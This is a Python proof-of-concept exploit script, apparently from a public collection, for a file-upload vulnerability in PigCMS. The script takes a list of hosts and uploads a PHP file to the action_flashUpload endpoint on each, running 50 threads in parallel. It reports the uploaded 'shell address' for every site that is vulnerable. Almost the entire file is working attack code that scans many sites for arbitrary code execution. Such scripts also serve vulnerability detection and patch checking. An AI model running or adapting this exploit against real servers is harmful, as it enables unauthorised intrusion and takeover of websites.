#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# product="小猪CMS"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 PigCMS_Action_FlashUpload_UploadFile_Poc.py url.txt                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8081'
}  
requests.packages.urllib3.disable_warnings()

def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "multipart/form-data; boundary=--------------------------835846770881083140190666",
        "Host": "%s" %host2
    }
    vulurl = url + "/cms/manage/admin.php?m=manage&c=background&a=action_flashUpload"
    data='----------------------------835846770881083140190666\r\nContent-Disposition: form-data; name="filePath"; filename="test.php"\r\nContent-Type: video/x-flv\r\n\r\n<?php print "test" ;unlink(__FILE__) ;?>\r\n----------------------------835846770881083140190666--'
    try:
        r = requests.post(vulurl, data=data,headers=headers,verify=False)
        #print(r.text)
        if "MAIN_URL_ROOT" in r.text :
            index=r.text.find("MAIN_URL_ROOT")
            print("shell地址为"+url+r.text[index+13:])     
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])